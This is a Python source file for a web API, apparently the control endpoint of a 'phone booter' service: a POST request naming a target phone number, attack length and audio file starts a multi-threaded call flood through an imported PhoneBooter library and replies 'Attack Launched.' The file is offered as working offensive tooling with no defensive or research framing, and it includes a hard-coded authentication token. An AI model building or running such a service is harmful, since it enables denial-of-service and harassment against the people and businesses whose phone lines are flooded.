import falcon
import asyncio
import json
from libs.phonebooter import PhoneBooter


class BooterAPI(object):

    def __init__(self):

        self.loop = asyncio.get_event_loop()
        self.numThreads = 8

    def on_post(self, req: falcon.Request, resp: falcon.Response):
        """Post Handler for starting new boots.
        {'Auth-Token': <authtoken>,
         'targetNum': '18005832300',
         'attackLength': 600,
         'wavFile': 'ducktales'}
        """

        try:
            raw_json = req.stream.read()

        except Exception as e:

            raise falcon.HTTPError(falcon.HTTP_500, 'Error', e)

        try:

            result_json = json.loads(raw_json, encoding='utf8')

        except ValueError as e:
            print(e)
            raise falcon.HTTPError(falcon.HTTP_400,
                                   'Malformed JSON',
                                   'Could not decode the request body. The '
                                   'JSON was incorrect.')

        try:
            # Check for auth
            auth_token = result_json['Auth-Token']
            if auth_token != "2B3240970C71346B98E00C5C83E8070484E9A1AC3D04D4488DEDC85F454E6180":

                raise falcon.HTTPError(falcon.HTTP_403, "Unauthorized.")

        except KeyError as e:
            print(e)
            raise falcon.HTTPError(falcon.HTTP_403, "Unauthorized.")

        targetNum = result_json['targetNum']
        attackLength = result_json['attackLength']

        try:
            optional = True
            wavFile = result_json['wavFile']

        except KeyError as e:

            optional = False

        booter = PhoneBooter()

        if optional:

            booter.start(targetNum=targetNum, numThreads=self.numThreads, bootLength=attackLength, wav=wavFile)

        else:

            booter.start(targetNum=targetNum, numThreads=self.numThreads, bootLength=attackLength, wav='hello-world')

        resp.status = falcon.HTTP_200
        json_resonse = {'Status': 'Attack Launched.'}
        resp.body = json.dumps(json_resonse)